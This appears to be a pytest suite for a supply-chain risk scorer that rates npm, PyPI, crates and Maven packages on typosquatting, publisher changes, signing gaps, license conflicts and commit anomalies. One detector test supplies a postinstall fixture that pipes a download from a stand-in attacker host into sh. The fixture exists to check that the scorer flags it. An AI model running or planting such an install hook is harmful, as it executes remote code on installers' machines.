from __future__ import annotations

import json
from datetime import datetime, timedelta, timezone

import pytest

from mw import db
from mw.ingest.maven import _bom_imports, _metadata_latest, _parse_pom
from mw.ingest.pypi import _is_extra, _license, _repo_url, _requirement_name
from mw.models import SignalEvidence
from mw.score import compute_score
from mw.signals import (
    account_age,
    bus_factor,
    commit_anomaly,
    dependency_risk,
    install_script,
    license_inconsistency,
    maintainer_continuity,
    package_age,
    publisher_change,
    release_anomaly,
    scorecard,
    signing_gap,
    signing_key_change,
    typosquat,
)
from mw.signals.base import Context


@pytest.fixture()
def conn():
    c = db.connect(":memory:")
    db.init_db(c)
    yield c
    c.close()


def _iso(days_ago: int) -> str:
    return (datetime.now(timezone.utc) - timedelta(days=days_ago)).isoformat()


def _add_package(conn, system="npm", name="pkg", downloads=0):
    conn.execute(
        "INSERT INTO packages (system, name, normalized, downloads_weekly) VALUES (?, ?, ?, ?)",
        (system, name, name.lower(), downloads),
    )


def _add_versions(conn, versions, system="npm", name="pkg"):
    for ver, published, publisher in versions:
        conn.execute(
            """INSERT INTO versions
                 (system, name, version, published_at, publisher_name, publisher_email,
                  has_sig, has_provenance, is_yanked)
               VALUES (?, ?, ?, ?, ?, ?, 0, 0, 0)""",
            (system, name, ver, published, publisher, publisher),
        )


def _add_repo(conn, created_days_ago, share, contributors, system="npm", name="pkg"):
    conn.execute(
        """INSERT INTO repo_stats
             (system, name, repo_url, owner, owner_created_at,
              contributors_12m, top_author_share)
           VALUES (?, ?, 'https://github.com/o/r', 'o', ?, ?, ?)""",
        (system, name, _iso(created_days_ago), contributors, share),
    )


def _add_maintainer(conn, identity, system="pypi", name="pkg"):
    conn.execute(
        """INSERT OR REPLACE INTO maintainers
             (system, name, identity, role, source)
           VALUES (?, ?, ?, 'maintainer', ?)""",
        (system, name, identity, system),
    )


def _add_commit(conn, days_ago, author, sha, system="npm", name="pkg"):
    conn.execute(
        """INSERT OR REPLACE INTO commits
             (system, name, sha, committed_at, author_login)
           VALUES (?, ?, ?, ?, ?)""",
        (system, name, sha, _iso(days_ago), author),
    )


def test_typosquat_flags_close_name(conn):
    _add_package(conn, name="reqeusts", downloads=10)
    ctx = Context(conn=conn, system="npm", name="reqeusts",
                  downloads_weekly=10, top_names=["requests", "react"])
    ev = typosquat.compute(ctx)
    assert ev.value == 1.0
    assert ev.evidence["nearest"] == "requests"


def test_typosquat_homoglyph_normalization(conn):
    _add_package(conn, name="l0d4sh", downloads=10)
    ctx = Context(conn=conn, system="npm", name="l0d4sh",
                  downloads_weekly=10, top_names=["lodash"])
    ev = typosquat.compute(ctx)
    assert ev.value == 1.0
    assert ev.evidence["homoglyph"] is True


def test_typosquat_keyboard_adjacent_typo(conn):
    _add_package(conn, name="reqyestz", downloads=10)
    ctx = Context(conn=conn, system="npm", name="reqyestz",
                  downloads_weekly=10, top_names=["requests"])
    ev = typosquat.compute(ctx)
    assert ev.value == 1.0
    assert ev.evidence["keyboard_typo"] is True


def test_typosquat_ignores_existing_top_package(conn):
    _add_package(conn, name="requests", downloads=10_000_000)
    ctx = Context(conn=conn, system="npm", name="requests",
                  downloads_weekly=10_000_000, top_names=["requests"])
    ev = typosquat.compute(ctx)
    assert ev.value == 0.0


def test_release_anomaly_detects_dormancy(conn):
    _add_package(conn)
    _add_versions(conn, [("1.0.0", "2020-01-01T00:00:00+00:00", "a"),
                         ("1.0.1", "2020-02-01T00:00:00+00:00", "a"),
                         ("1.0.2", "2020-03-01T00:00:00+00:00", "a"),
                         ("2.0.0", "2023-01-01T00:00:00+00:00", "a")])
    ctx = Context(conn=conn, system="npm", name="pkg")
    ev = release_anomaly.compute(ctx)
    assert ev.applicable is True
    assert ev.evidence["dormancy"] == 1.0
    assert ev.value >= 0.8


def test_release_anomaly_all_same_timestamp_not_applicable(conn):
    _add_package(conn)
    ts = "2025-01-01T00:00:00+00:00"
    _add_versions(conn, [("1.0.0", ts, "a"), ("1.0.1", ts, "a"), ("1.0.2", ts, "a")])
    ev = release_anomaly.compute(Context(conn=conn, system="npm", name="pkg"))
    assert ev.applicable is False


def test_release_anomaly_initial_burst_not_flagged(conn):
    _add_package(conn)
    _add_versions(conn, [
        ("1.0.0", "2025-01-01T00:00:00+00:00", "a"),
        ("1.0.1", "2025-01-01T06:00:00+00:00", "a"),
        ("1.0.2", "2025-01-01T12:00:00+00:00", "a"),
    ])
    ev = release_anomaly.compute(Context(conn=conn, system="npm", name="pkg"))
    assert ev.evidence["burst"] == 0.0


def test_release_anomaly_not_applicable_with_few_versions(conn):
    _add_package(conn)
    _add_versions(conn, [("1.0.0", "2020-01-01T00:00:00+00:00", "a")])
    ev = release_anomaly.compute(Context(conn=conn, system="npm", name="pkg"))
    assert ev.applicable is False


def test_release_anomaly_maven_not_applicable(conn):
    _add_package(conn, system="maven")
    _add_versions(conn, [("1.0.0", "2020-01-01T00:00:00+00:00", "a"),
                         ("1.0.1", "2020-02-01T00:00:00+00:00", "a"),
                         ("1.0.2", "2023-01-01T00:00:00+00:00", "a")],
                  system="maven")
    ev = release_anomaly.compute(Context(conn=conn, system="maven", name="pkg"))
    assert ev.applicable is False


def test_signing_gap_npm_no_provenance_is_baseline(conn):
    _add_package(conn)
    _add_versions(conn, [("1.0.0", _iso(10), "a")])
    ev = signing_gap.compute(Context(conn=conn, system="npm", name="pkg"))
    assert ev.applicable is True
    assert ev.value == 1.0
    assert ev.evidence["baseline_unsigned"] is True


def test_signing_gap_npm_mature_low_adoption_baseline(conn):
    _add_package(conn, downloads=50)
    _add_versions(conn, [("1.0.0", _iso(500), "a")])
    ev = signing_gap.compute(Context(conn=conn, system="npm", name="pkg",
                                     downloads_weekly=50))
    assert ev.value == 0.7
    assert ev.evidence["low_adoption"] is True


def test_signing_gap_npm_mature_popular_baseline(conn):
    _add_package(conn, downloads=500_000)
    _add_versions(conn, [("1.0.0", _iso(2000), "a")])
    ev = signing_gap.compute(Context(conn=conn, system="npm", name="pkg",
                                     downloads_weekly=500_000))
    assert ev.value == 0.3


def test_signing_gap_npm_regression(conn):
    _add_package(conn)
    _add_versions(conn, [
        ("1.0.0", "2020-01-01T00:00:00+00:00", "a"),
        ("1.1.0", "2020-02-01T00:00:00+00:00", "a"),
        ("1.2.0", "2020-03-01T00:00:00+00:00", "a"),
        ("1.3.0", "2020-04-01T00:00:00+00:00", "a"),
        ("1.4.0", "2020-05-01T00:00:00+00:00", "a"),
        ("1.5.0", "2020-06-01T00:00:00+00:00", "a"),
    ])
    conn.execute("UPDATE versions SET has_provenance=1 WHERE version='1.0.0'")
    ev = signing_gap.compute(Context(conn=conn, system="npm", name="pkg"))
    assert ev.value == 1.0


def test_signing_gap_npm_partial_coverage(conn):
    _add_package(conn)
    _add_versions(conn, [
        ("1.0.0", "2020-01-01T00:00:00+00:00", "a"),
        ("1.1.0", "2020-02-01T00:00:00+00:00", "a"),
        ("1.2.0", "2020-03-01T00:00:00+00:00", "a"),
        ("1.3.0", "2020-04-01T00:00:00+00:00", "a"),
        ("1.4.0", "2020-05-01T00:00:00+00:00", "a"),
    ])
    conn.execute("UPDATE versions SET has_provenance=1 WHERE version IN ('1.0.0','1.1.0')")
    ev = signing_gap.compute(Context(conn=conn, system="npm", name="pkg"))
    assert ev.value == 0.6


def test_signing_gap_pypi_signed(conn):
    _add_package(conn, system="pypi")
    conn.execute(
        """INSERT INTO versions (system, name, version, published_at, has_sig)
           VALUES ('pypi', 'pkg', '1.0.0', '2020-01-01T00:00:00+00:00', 1)"""
    )
    ev = signing_gap.compute(Context(conn=conn, system="pypi", name="pkg"))
    assert ev.value == 0.0


def test_signing_gap_pypi_unsigned_not_applicable(conn):
    _add_package(conn, system="pypi")
    conn.execute(
        """INSERT INTO versions (system, name, version, published_at)
           VALUES ('pypi', 'pkg', '1.0.0', '2020-01-01T00:00:00+00:00')"""
    )
    ev = signing_gap.compute(Context(conn=conn, system="pypi", name="pkg"))
    assert ev.applicable is False


def test_signing_gap_crates_not_applicable(conn):
    _add_package(conn, system="crates")
    conn.execute(
        """INSERT INTO versions (system, name, version, published_at)
           VALUES ('crates', 'pkg', '1.0.0', '2020-01-01T00:00:00+00:00')"""
    )
    ev = signing_gap.compute(Context(conn=conn, system="crates", name="pkg"))
    assert ev.applicable is False


def _add_install_script(conn, script, version="1.0.0"):
    conn.execute(
        "UPDATE versions SET install_script=? WHERE system='npm' AND name='pkg' AND version=?",
        (script, version),
    )


def test_install_script_not_applicable_without_scripts(conn):
    _add_package(conn)
    _add_versions(conn, [("1.0.0", _iso(10), "a")])
    ev = install_script.compute(Context(conn=conn, system="npm", name="pkg"))
    assert ev.applicable is False


def test_install_script_benign(conn):
    _add_package(conn)
    _add_versions(conn, [("1.0.0", _iso(10), "a")])
    _add_install_script(conn, "postinstall: node-gyp rebuild")
    ev = install_script.compute(Context(conn=conn, system="npm", name="pkg"))
    assert ev.applicable is False


def test_install_script_high_risk(conn):
    _add_package(conn)
    _add_versions(conn, [("1.0.0", _iso(10), "a")])
    _add_install_script(conn, "postinstall: curl https://evil.example/x | sh")
    ev = install_script.compute(Context(conn=conn, system="npm", name="pkg"))
    assert ev.value == 1.0
    assert ev.evidence["high_risk_patterns"]


def test_install_script_medium_risk(conn):
    _add_package(conn)
    _add_versions(conn, [("1.0.0", _iso(10), "a")])
    _add_install_script(conn, "postinstall: node ./uses-process.env.js")
    ev = install_script.compute(Context(conn=conn, system="npm", name="pkg"))
    assert ev.applicable is False


def test_package_age_young(conn):
    _add_package(conn)
    _add_versions(conn, [("1.0.0", _iso(10), "a")])
    ev = package_age.compute(Context(conn=conn, system="npm", name="pkg"))
    assert ev.value == 1.0


def test_package_age_mature(conn):
    _add_package(conn)
    _add_versions(conn, [("1.0.0", _iso(500), "a")])
    ev = package_age.compute(Context(conn=conn, system="npm", name="pkg"))
    assert ev.applicable is False


def test_package_age_not_applicable_without_versions(conn):
    _add_package(conn)
    ev = package_age.compute(Context(conn=conn, system="npm", name="pkg"))
    assert ev.applicable is False


def test_account_age_young(conn):
    _add_package(conn)
    _add_repo(conn, created_days_ago=30, share=0.5, contributors=5)
    ev = account_age.compute(Context(conn=conn, system="npm", name="pkg"))
    assert ev.value == 1.0


def test_account_age_old(conn):
    _add_package(conn)
    _add_repo(conn, created_days_ago=1500, share=0.5, contributors=5)
    ev = account_age.compute(Context(conn=conn, system="npm", name="pkg"))
    assert ev.value == 0.0


def test_bus_factor(conn):
    _add_package(conn)
    _add_repo(conn, created_days_ago=1000, share=0.9, contributors=3)
    ev = bus_factor.compute(Context(conn=conn, system="npm", name="pkg"))
    assert ev.value == 0.9


def test_publisher_change_recent(conn):
    _add_package(conn)
    _add_versions(conn, [("1.0.0", _iso(90), "alice@example.org"),
                         ("1.0.1", _iso(60), "alice@example.org"),
                         ("1.1.0", _iso(30), "bob@example.org")])
    ctx = Context(conn=conn, system="npm", name="pkg")
    ev = publisher_change.compute(ctx)
    assert ev.applicable is True
    assert ev.evidence["n_recent"] == 1
    assert ev.value == 0.5


def test_publisher_change_uses_identity_mapping(conn):
    _add_package(conn)
    _add_versions(conn, [("1.0.0", _iso(90), "alice@example.org"),
                         ("1.0.1", _iso(30), "alice@personal.org")])
    ctx = Context(conn=conn, system="npm", name="pkg",
                  identity_mapping={"alice@personal.org": "alice@example.org"})
    ev = publisher_change.compute(ctx)
    assert ev.evidence["n_recent"] == 0


def test_publisher_change_ignores_automation(conn):
    _add_package(conn)
    _add_versions(conn, [("1.0.0", _iso(90), "alice@example.org"),
                         ("1.0.1", _iso(60), "npm-oidc-no-reply@github.com"),
                         ("1.0.2", _iso(30), "alice@example.org")])
    ctx = Context(conn=conn, system="npm", name="pkg",
                  automation_identities=["npm-oidc-no-reply@github.com"],
                  automation_patterns=[r"\+oss-bot@"])
    ev = publisher_change.compute(ctx)
    assert ev.evidence["n_recent"] == 0
    assert ev.value == 0.0


def test_publisher_change_skips_bot_between_people(conn):
    _add_package(conn)
    _add_versions(conn, [("1.0.0", _iso(90), "alice@example.org"),
                         ("1.0.1", _iso(60), "npm-oidc-no-reply@github.com"),
                         ("1.0.2", _iso(30), "bob@example.org")])
    ctx = Context(conn=conn, system="npm", name="pkg",
                  automation_identities=["npm-oidc-no-reply@github.com"],
                  automation_patterns=[r"\+oss-bot@"])
    ev = publisher_change.compute(ctx)
    assert ev.evidence["n_recent"] == 1
    assert ev.value == 0.5


def test_pypi_snapshot_detects_added_maintainer(conn):
    _add_package(conn, system="pypi")
    _add_versions(conn, [("1.0.0", _iso(600), "alice"),
                         ("1.1.0", _iso(300), "alice")], system="pypi")
    _add_maintainer(conn, "alice")
    _add_maintainer(conn, "bob")
    db.record_snapshot(conn, "pypi", "pkg", _iso(300),
                       json.dumps(["alice"]), "hash-old")
    ev = publisher_change.compute(Context(conn=conn, system="pypi", name="pkg"))
    assert ev.applicable is True
    assert ev.value == 0.35
    assert ev.evidence["source"] == "snapshot"
    assert ev.evidence["added"] == ["bob"]
    assert ev.evidence["removed"] == []


def test_pypi_snapshot_unchanged(conn):
    _add_package(conn, system="pypi")
    _add_versions(conn, [("1.0.0", _iso(600), "alice"),
                         ("1.1.0", _iso(300), "alice")], system="pypi")
    _add_maintainer(conn, "alice")
    db.record_snapshot(conn, "pypi", "pkg", _iso(300),
                       json.dumps(["alice"]), "hash-old")
    ev = publisher_change.compute(Context(conn=conn, system="pypi", name="pkg"))
    assert ev.applicable is True
    assert ev.value == 0.0
    assert ev.evidence["added"] == []


def test_pypi_without_snapshot_not_applicable(conn):
    _add_package(conn, system="pypi")
    _add_versions(conn, [("1.0.0", _iso(600), "alice"),
                         ("1.1.0", _iso(300), "alice")], system="pypi")
    _add_maintainer(conn, "alice")
    ev = publisher_change.compute(Context(conn=conn, system="pypi", name="pkg"))
    assert ev.applicable is False


def test_pypi_recent_snapshot_is_ignored(conn):
    _add_package(conn, system="pypi")
    _add_versions(conn, [("1.0.0", _iso(600), "alice"),
                         ("1.1.0", _iso(300), "alice")], system="pypi")
    _add_maintainer(conn, "alice")
    db.record_snapshot(conn, "pypi", "pkg", _iso(30),
                       json.dumps(["bob"]), "hash-recent")
    ev = publisher_change.compute(Context(conn=conn, system="pypi", name="pkg"))
    assert ev.applicable is False


def test_pypi_old_snapshot_is_ignored(conn):
    _add_package(conn, system="pypi")
    _add_versions(conn, [("1.0.0", _iso(600), "alice"),
                         ("1.1.0", _iso(300), "alice")], system="pypi")
    _add_maintainer(conn, "alice")
    db.record_snapshot(conn, "pypi", "pkg", _iso(400),
                       json.dumps(["bob"]), "hash-old")
    ev = publisher_change.compute(Context(conn=conn, system="pypi", name="pkg"))
    assert ev.applicable is False


def test_publisher_change_old_maintainer_still_present(conn):
    _add_package(conn)
    _add_versions(conn, [("1.0.0", _iso(90), "alice@example.org"),
                         ("1.0.1", _iso(30), "bob@example.org")])
    _add_maintainer(conn, "alice@example.org", system="npm")
    _add_maintainer(conn, "bob@example.org", system="npm")
    ev = publisher_change.compute(Context(conn=conn, system="npm", name="pkg"))
    assert ev.value == 0.025
    assert ev.evidence["n_legitimate"] == 1
    assert "old maintainer still has maintainer access" in (
        ev.evidence["recent_changes"][0]["legitimacy"]["reasons"]
    )


def test_publisher_change_shared_packages(conn):
    _add_package(conn)
    _add_versions(conn, [("1.0.0", _iso(90), "alice@example.org"),
                         ("1.0.1", _iso(30), "bob@example.org")])
    _add_package(conn, name="shared")
    _add_maintainer(conn, "alice@example.org", system="npm", name="shared")
    _add_maintainer(conn, "bob@example.org", system="npm", name="shared")
    ev = publisher_change.compute(Context(conn=conn, system="npm", name="pkg"))
    assert ev.value == 0.03
    assert ev.evidence["recent_changes"][0]["legitimacy"]["shared_package_count"] == 1


def test_publisher_change_young_package(conn):
    _add_package(conn)
    conn.execute("UPDATE packages SET first_seen=? WHERE system='npm' AND name='pkg'", (_iso(30),))
    _add_versions(conn, [("1.0.0", _iso(20), "alice@example.org"),
                         ("1.0.1", _iso(10), "bob@example.org")])
    ev = publisher_change.compute(Context(conn=conn, system="npm", name="pkg"))
    assert round(ev.value, 3) == 0.04
    assert "package is younger than one year" in (
        ev.evidence["recent_changes"][0]["legitimacy"]["reasons"]
    )


def test_publisher_change_new_publisher_seen_before(conn):
    _add_package(conn)
    _add_versions(conn, [("1.0.0", _iso(500), "bob@example.org"),
                         ("1.1.0", _iso(400), "alice@example.org"),
                         ("1.2.0", _iso(200), "alice@example.org"),
                         ("1.3.0", _iso(30), "bob@example.org")])
    ev = publisher_change.compute(Context(conn=conn, system="npm", name="pkg"))
    assert ev.value == 0.03
    change = ev.evidence["recent_changes"][-1]
    assert change["legitimacy"]["new_publisher_seen_before"] is True


def test_publisher_change_same_email_domain(conn):
    _add_package(conn)
    _add_versions(conn, [("1.0.0", _iso(90), "typescript@microsoft.com"),
                         ("1.0.1", _iso(30), "npmjs@microsoft.com")])
    ev = publisher_change.compute(Context(conn=conn, system="npm", name="pkg"))
    assert ev.value == 0.03
    assert ev.evidence["n_legitimate"] == 1
    assert "old and new publishers share an email domain" in (
        ev.evidence["recent_changes"][0]["legitimacy"]["reasons"]
    )


def test_publisher_change_public_email_domain_not_legitimate(conn):
    _add_package(conn)
    _add_versions(conn, [("1.0.0", _iso(90), "alice@gmail.com"),
                         ("1.0.1", _iso(30), "bob@gmail.com")])
    ev = publisher_change.compute(Context(conn=conn, system="npm", name="pkg"))
    assert ev.value == 0.5
    assert ev.evidence["n_legitimate"] == 0


def test_pypi_snapshot_without_current_maintainers_not_applicable(conn):
    _add_package(conn)
    db.record_snapshot(conn, "pypi", "pkg", _iso(300),
                       json.dumps(["alice"]), "hash-old")
    db.record_snapshot(conn, "pypi", "pkg", _iso(0),
                       json.dumps([]), "hash-new")
    ev = publisher_change.compute(Context(conn=conn, system="pypi", name="pkg"))
    assert ev.applicable is False


def test_top_names_filters_low_adoption(conn):
    _add_package(conn, name="popular", downloads=500_000)
    _add_package(conn, name="obscure", downloads=10)
    assert db.top_names(conn, "npm", min_downloads=100_000) == ["popular"]


def test_score_is_reproducible():
    signals = {
        "publisher_change": SignalEvidence(value=0.5, evidence={"n_recent": 1}),
        "bus_factor": SignalEvidence(value=0.9, evidence={"share": 0.9}),
        "typosquat": SignalEvidence(value=0.0, evidence={"distance": 9}),
    }
    weights = {"publisher_change": 30, "bus_factor": 20, "typosquat": 10}
    a = compute_score(signals, weights, "0.1.0")
    b = compute_score(signals, weights, "0.1.0")
    assert a == b
    assert a[1] in {"low", "medium", "high"}


def test_score_ignores_not_applicable():
    signals = {
        "publisher_change": SignalEvidence(value=1.0, applicable=False, evidence={}),
        "typosquat": SignalEvidence(value=0.0, evidence={}),
    }
    score, band, _ = compute_score(signals, {"publisher_change": 30, "typosquat": 10}, "0.1.0")
    assert score == 0.0
    assert band == "low"


def test_license_missing(conn):
    _add_package(conn)
    ev = license_inconsistency.compute(Context(conn=conn, system="npm", name="pkg"))
    assert ev.value == 1.0


def test_license_recognised(conn):
    _add_package(conn)
    ev = license_inconsistency.compute(
        Context(conn=conn, system="npm", name="pkg", license="MIT")
    )
    assert ev.value == 0.0


def test_license_alias_recognised(conn):
    _add_package(conn)
    ev = license_inconsistency.compute(
        Context(conn=conn, system="npm", name="pkg", license="BSD License")
    )
    assert ev.value == 0.0


def test_license_unknown(conn):
    _add_package(conn)
    ev = license_inconsistency.compute(
        Context(conn=conn, system="npm", name="pkg", license="Unknown")
    )
    assert ev.value == 1.0


def test_license_custom(conn):
    _add_package(conn)
    ev = license_inconsistency.compute(
        Context(conn=conn, system="npm", name="pkg", license="Proprietary")
    )
    assert ev.value == 0.5


def test_license_classifier_conflict(conn):
    _add_package(conn)
    ev = license_inconsistency.compute(
        Context(conn=conn, system="pypi", name="pkg",
                license="MIT", license_classifier="Apache-2.0")
    )
    assert ev.value == 1.0
    assert "classifier" in ev.evidence["conflicts"]


def test_license_classifier_alias(conn):
    _add_package(conn)
    ev = license_inconsistency.compute(
        Context(conn=conn, system="pypi", name="pkg",
                license="MIT", license_classifier="Apache Software License")
    )
    assert ev.value == 1.0
    assert "classifier" in ev.evidence["conflicts"]


def test_license_classifier_compatible(conn):
    _add_package(conn)
    ev = license_inconsistency.compute(
        Context(conn=conn, system="pypi", name="pkg",
                license="MIT", license_classifier="MIT License")
    )
    assert ev.value == 0.0
    assert ev.evidence["conflicts"] == []


def test_license_repo_conflict(conn):
    _add_package(conn)
    ev = license_inconsistency.compute(
        Context(conn=conn, system="npm", name="pkg",
                license="Apache-2.0", license_repo="MIT")
    )
    assert ev.value == 1.0
    assert "repository" in ev.evidence["conflicts"]


def test_license_compound_matches_repo(conn):
    _add_package(conn)
    ev = license_inconsistency.compute(
        Context(conn=conn, system="npm", name="pkg",
                license="MIT OR Apache-2.0", license_repo="Apache-2.0")
    )
    assert ev.value == 0.0


def test_license_missing_repo_is_not_a_conflict(conn):
    _add_package(conn)
    ev = license_inconsistency.compute(
        Context(conn=conn, system="npm", name="pkg", license="MIT")
    )
    assert ev.value == 0.0


def test_pypi_requirement_name():
    assert _requirement_name("requests>=2; python_version>='3.8'") == "requests"
    assert _requirement_name("foo[bar]==1.0") == "foo"
    assert _requirement_name("zope.interface (>=5)") == "zope-interface"
    assert _requirement_name("name @ https://example.org/x.whl") == "name"


def test_pypi_extra_marker():
    assert _is_extra("pytest; extra == 'test'") is True
    assert _is_extra('pytest; extra == "dev"') is True
    assert _is_extra("requests>=2") is False
    assert _is_extra("importlib-metadata; python_version < '3.8'") is False


def test_transitive_fan_in(conn):
    for name in ("a", "b", "c"):
        _add_package(conn, system="npm", name=name)
    db.upsert_dependencies(conn, [
        ("npm", "a", "1.0", "npm", "b"),
        ("npm", "b", "1.0", "npm", "c"),
    ])
    db.update_dependency_counts(conn)
    rows = {
        row["name"]: row
        for row in conn.execute(
            "SELECT name, fan_in, fan_in_transitive, dependencies_count FROM packages"
        )
    }
    assert rows["c"]["fan_in"] == 1
    assert rows["c"]["fan_in_transitive"] == 2
    assert rows["b"]["fan_in"] == 1
    assert rows["b"]["fan_in_transitive"] == 1
    assert rows["a"]["fan_in"] == 0
    assert rows["a"]["fan_in_transitive"] == 0


def test_transitive_fan_in_cycle(conn):
    for name in ("a", "b"):
        _add_package(conn, system="npm", name=name)
    db.upsert_dependencies(conn, [
        ("npm", "a", "1.0", "npm", "b"),
        ("npm", "b", "1.0", "npm", "a"),
    ])
    db.update_dependency_counts(conn)
    rows = {
        row["name"]: row
        for row in conn.execute(
            "SELECT name, fan_in_transitive FROM packages"
        )
    }
    assert rows["a"]["fan_in_transitive"] == 1
    assert rows["b"]["fan_in_transitive"] == 1


def test_commit_anomaly_new_authors(conn):
    _add_package(conn)
    _add_commit(conn, 600, "alice", "old-alice")
    for index in range(4):
        _add_commit(conn, 80 - index * 10, "alice", f"alice-{index}")
    for index in range(8):
        _add_commit(conn, 15 + index * 10, "bob", f"bob-{index}")
    ev = commit_anomaly.compute(Context(conn=conn, system="npm", name="pkg"))
    assert ev.applicable is True
    assert ev.evidence["new_author_share"] > 0.5
    assert ev.value > 0.25


def test_commit_anomaly_burst(conn):
    _add_package(conn)
    _add_commit(conn, 600, "alice", "old")
    for index in range(10):
        _add_commit(conn, 29 - index, "alice", f"recent-{index}")
    ev = commit_anomaly.compute(Context(conn=conn, system="npm", name="pkg"))
    assert ev.applicable is True
    assert ev.evidence["burst_value"] == 1.0
    assert ev.value == 1.0


def test_commit_anomaly_short_history_not_applicable(conn):
    _add_package(conn)
    for index in range(10):
        _add_commit(conn, 10 + index, "alice", f"c-{index}")
    ev = commit_anomaly.compute(Context(conn=conn, system="npm", name="pkg"))
    assert ev.applicable is False
    assert ev.evidence["reason"] == "commit history shorter than 180 days"


def test_release_anomaly_crates_dormancy_capped(conn):
    _add_package(conn, system="crates")
    _add_versions(conn, [
        ("1.0.0", "2020-01-01T00:00:00+00:00", "a"),
        ("1.0.1", "2020-02-01T00:00:00+00:00", "a"),
        ("1.0.2", "2020-03-01T00:00:00+00:00", "a"),
        ("2.0.0", "2023-01-01T00:00:00+00:00", "a"),
    ], system="crates")
    ev = release_anomaly.compute(Context(conn=conn, system="crates", name="pkg"))
    assert ev.value <= 0.5
    assert ev.evidence["calibrated_cap"] is True


def test_commit_anomaly_not_applicable(conn):
    _add_package(conn)
    _add_commit(conn, 10, "alice", "one")
    _add_commit(conn, 20, "alice", "two")
    ev = commit_anomaly.compute(Context(conn=conn, system="npm", name="pkg"))
    assert ev.applicable is False


def test_maintainer_continuity_new_author(conn):
    _add_package(conn)
    for index in range(10):
        _add_commit(conn, 600 - index * 20, "alice", f"old-{index}")
    for index in range(8):
        _add_commit(conn, 30 - index, "bob", f"new-{index}")
    ev = maintainer_continuity.compute(Context(conn=conn, system="npm", name="pkg"))
    assert ev.value == 0.9
    assert ev.evidence["recent_top"] == "bob"


def test_maintainer_continuity_handover(conn):
    _add_package(conn)
    for index in range(8):
        _add_commit(conn, 600 - index * 20, "alice", f"old-a-{index}")
    for index in range(2):
        _add_commit(conn, 500 - index, "bob", f"old-b-{index}")
    for index in range(6):
        _add_commit(conn, 30 - index, "bob", f"new-{index}")
    ev = maintainer_continuity.compute(Context(conn=conn, system="npm", name="pkg"))
    assert ev.value == 0.7
    assert ev.evidence["historical_top"] == "alice"


def test_maintainer_continuity_single_maintainer(conn):
    _add_package(conn)
    _add_maintainer(conn, "alice", system="npm")
    for index in range(10):
        _add_commit(conn, 600 - index * 20, "alice", f"c-{index}")
    for index in range(5):
        _add_commit(conn, 30 - index, "alice", f"recent-{index}")
    ev = maintainer_continuity.compute(Context(conn=conn, system="npm", name="pkg"))
    assert ev.value == 0.3


def test_signing_key_change(conn):
    _add_package(conn)
    conn.execute(
        """INSERT INTO versions (system, name, version, published_at, publisher_key_id)
           VALUES ('npm', 'pkg', '1.0.0', '2024-01-01', 'KEY1')"""
    )
    conn.execute(
        """INSERT INTO versions (system, name, version, published_at, publisher_key_id)
           VALUES ('npm', 'pkg', '1.1.0', '2024-02-01', 'KEY1')"""
    )
    ev = signing_key_change.compute(Context(conn=conn, system="npm", name="pkg"))
    assert ev.applicable is True
    assert ev.value == 0.0
    conn.execute(
        """INSERT INTO versions (system, name, version, published_at, publisher_key_id)
           VALUES ('npm', 'pkg', '1.2.0', '2024-03-01', 'KEY2')"""
    )
    ev = signing_key_change.compute(Context(conn=conn, system="npm", name="pkg"))
    assert ev.value == 1.0
    assert ev.evidence["keys"] == ["KEY1", "KEY2"]


def test_signing_key_change_without_data(conn):
    _add_package(conn)
    conn.execute(
        """INSERT INTO versions (system, name, version, published_at)
           VALUES ('npm', 'pkg', '1.0.0', '2024-01-01')"""
    )
    ev = signing_key_change.compute(Context(conn=conn, system="npm", name="pkg"))
    assert ev.applicable is False


def test_scorecard_signal(conn):
    _add_package(conn)
    conn.execute(
        """INSERT INTO repo_stats (system, name, scorecard_score)
           VALUES ('npm', 'pkg', 8.0)"""
    )
    ev = scorecard.compute(Context(conn=conn, system="npm", name="pkg"))
    assert ev.applicable is True
    assert ev.value == 0.0
    conn.execute("UPDATE repo_stats SET scorecard_score=0 WHERE system='npm' AND name='pkg'")
    ev = scorecard.compute(Context(conn=conn, system="npm", name="pkg"))
    assert ev.value == 1.0


def test_scorecard_without_data(conn):
    _add_package(conn)
    ev = scorecard.compute(Context(conn=conn, system="npm", name="pkg"))
    assert ev.applicable is False


def test_dependency_risk(conn):
    _add_package(conn)
    ev = dependency_risk.compute(Context(conn=conn, system="npm", name="pkg"))
    assert ev.applicable is False
    ev = dependency_risk.compute(
        Context(conn=conn, system="npm", name="pkg", fan_in_transitive=200)
    )
    assert ev.value == 1.0
    ev = dependency_risk.compute(
        Context(conn=conn, system="npm", name="pkg",
                fan_in_transitive=0, dependencies_count=20)
    )
    assert 0.0 < ev.value <= 0.3


def test_pypi_license_prefers_expression():
    assert _license(
        {"license_expression": "BSD-3-Clause", "license": None, "classifiers": []}
    ) == "BSD-3-Clause"
    assert _license({"license": "MIT", "classifiers": []}) == "MIT"
    assert _license(
        {
            "license": None,
            "classifiers": ["License :: OSI Approved :: MIT License"],
        }
    ) == "MIT License"
    assert _license({"license": "Unknown", "classifiers": []}) is None


def test_pypi_repo_url_prefers_repo_over_conduct():
    info = {
        "project_urls": {
            "Code of Conduct": "https://github.com/org/.github/blob/master/CODE_OF_CONDUCT.md",
            "GitHub: repo": "https://github.com/org/project",
        },
        "home_page": None,
    }
    assert _repo_url(info) == "https://github.com/org/project"


def test_pypi_repo_url_ignores_docs():
    info = {
        "project_urls": {"Documentation": "https://docs.example.org"},
        "home_page": "https://github.com/org/project",
    }
    assert _repo_url(info) == "https://github.com/org/project"


def test_parse_maven_pom():
    pom = """<project xmlns="http://maven.apache.org/POM/4.0.0">
      <licenses><license><name>Apache-2.0</name></license></licenses>
      <scm><url>https://github.com/example/repo</url></scm>
      <developers><developer><id>alice</id></developer></developers>
      <dependencies>
        <dependency><groupId>com.google.guava</groupId><artifactId>guava</artifactId></dependency>
        <dependency><groupId>org.test</groupId><artifactId>test</artifactId><scope>test</scope></dependency>
      </dependencies>
    </project>"""
    license_name, scm, deps, developers = _parse_pom(pom)
    assert license_name == "Apache-2.0"
    assert scm == "https://github.com/example/repo"
    assert "com.google.guava:guava" in deps
    assert "org.test:test" not in deps
    assert "alice" in developers


def test_parse_maven_pom_resolves_properties():
    pom = """<project xmlns="http://maven.apache.org/POM/4.0.0">
      <groupId>com.example</groupId>
      <artifactId>demo</artifactId>
      <version>1.2.3</version>
      <properties><license.name>Apache-2.0</license.name></properties>
      <licenses><license><name>${license.name}</name></license></licenses>
      <scm><url>https://github.com/example/${project.artifactId}</url></scm>
      <dependencies>
        <dependency><groupId>${project.groupId}</groupId><artifactId>dep</artifactId></dependency>
      </dependencies>
    </project>"""
    license_name, scm, deps, _ = _parse_pom(pom)
